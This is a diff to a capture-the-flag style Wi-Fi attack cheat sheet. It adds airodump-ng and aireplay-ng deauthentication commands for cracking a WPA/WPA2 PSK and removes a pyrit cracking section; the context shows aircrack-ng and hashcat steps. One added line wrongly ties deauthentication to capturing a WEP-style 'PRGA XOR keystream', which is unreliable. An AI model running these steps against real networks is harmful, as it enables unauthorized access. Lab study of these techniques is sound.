@@ -34,7 +34,7 @@ $ airodump-ng wlan0mon -c 36 --band a --bssid E0:05:C5:60:2E:65 --ivs -w capture
   - `--band` Select the wireless band. 'b' and 'g' uses 2.4GHz and 'a' uses 5GHz.
 
 ## Scenarios
-There are different scenarios in which the target network may be configured. These may be access points with or without a client, a client looking for an access point, or a compromising an access point via a client. The next section contains some of those known scenarios with procedures.
+There are different scenarios in which the target network may be configured. These may be access points with or without a client, a client looking for an access point, or compromising an access point via a client. The next section contains some of those known scenarios with procedures.
 
 ### WEP with connected client
 This scenario is generally straight forward. Use a `while true` loop for deauthenticating client if necessary.
@@ -92,13 +92,18 @@ $ aireplay-ng -3 -e CTF_01 wlan0mon
 ```
 5) Run `aircrack-ng` to obtain the WEP key.
 
-### WPA/WPA2 with clients
-Steps to perform an attack on a WPA/WPA2 access point with clients. The pre-shared (PSK) must be in the wordlists used.
+### WPA/WPA2 PSK with clients
+Steps to perform an attack on a WPA/WPA2 access point with clients. The pre-shared (PSK) must be in the wordlists used. There is a bug in versions older than 1.5 where this will fail.
 
-There is a bug in versions older than 1.5 where this will fail.
-  1) Monitor and capture the target network traffic using `airodump-ng`.
-  2) In a new console execute Deauthentication attack method on associated client(s).
-  3) Run `aircrack-ng` to obtain the PSK.
+1) Monitor and capture the target network traffic.
+```code
+$ airodump-ng wlan0mon -c 6 -e CTF_01 -w capture
+```
+2) Force the connected client to deauthenticate to capture the PRGA XOR keystream.
+```code
+$ aireplay-ng -0 3 -e CTF_01 -c client_mac wlan0mon
+```
+3) Run `aircrack-ng` to obtain the PSK key.
 
 ### aircrack-ng
 Begin cracking IVS file on target BSSID (can perform while airodump-ng is writing).
@@ -240,33 +245,6 @@ Begin batch processing of passwords to essid's.
 $ airolib-ng CTF --batch
 ```
 
-### pyrit
-[pyrit](https://tools.kali.org/wireless-attacks/pyrit) is a WPA/WPA2-PSK tool that allows for creating a large database for authentication and cracking.
-Analyze a packet capture file.
-```code
-$ pyrit -r capture.cap analyze
-```
-
-Import passwords from a file into the database.
-```code
-$ pyrit -i /usr/share/wordlists/spy_vs_spy.words import_passwords
-```
-
-Create a new ESSID (or `-b` for BSSID) into the database.
-```code
-$ pyrit -e "access_point" create_essid
-```
-
-Batch process the database.
-```code
-$ pyrit batch
-```
-
-Attack all handshakes from the database.
-```code
-$ pyrit -r capture.cap --all-handshakes attack_db
-```
-
 ### hcxdumptool
 This technique requires a slightly different approach and is used against PSK networks. Set up the interface below.
 ```code
@@ -293,7 +271,7 @@ $ hashcat -m 16800 pmkidhash /usr/share/wordlists/cyberpunk.words --force
 ```
 
 ### wifite
-[wifite](https://github.com/derv82/wifite2) is a tool that automates the process. Follow the instructions to cheat.
+[wifite](https://github.com/derv82/wifite2) is a tool that automates the process. No instructions, read the man page.
 
 ## Quick & Useful
 
